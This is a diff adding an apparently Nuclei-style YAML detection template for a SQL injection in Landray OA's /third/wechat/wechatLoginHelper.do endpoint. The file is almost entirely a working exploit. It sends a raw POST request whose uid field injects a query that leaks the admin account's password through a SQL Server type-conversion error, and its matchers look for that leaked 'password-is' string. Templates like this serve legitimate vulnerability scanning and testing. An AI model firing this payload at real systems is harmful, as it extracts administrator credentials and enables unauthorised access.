@@ -1,0 +1,22 @@
+id: poc-yaml-landray-wechatloginhelper-do-sqli
+info:
+  name: Landray OA WechatLoginHelper SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - raw:
+      - |
+        POST /third/wechat/wechatLoginHelper.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        method=edit&uid=1'and+(SELECT+'password-is:'%2BfdPassword%2B'----'+FROM+com.landray.kmss.sys.organization.model.SysOrgPerson+where+fdLoginName='admin')=1+and+'1'='1
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "转换成数据类型 int 时失败"
+          - "在将 nvarchar 值"
+          - "password-is"
+        part: body
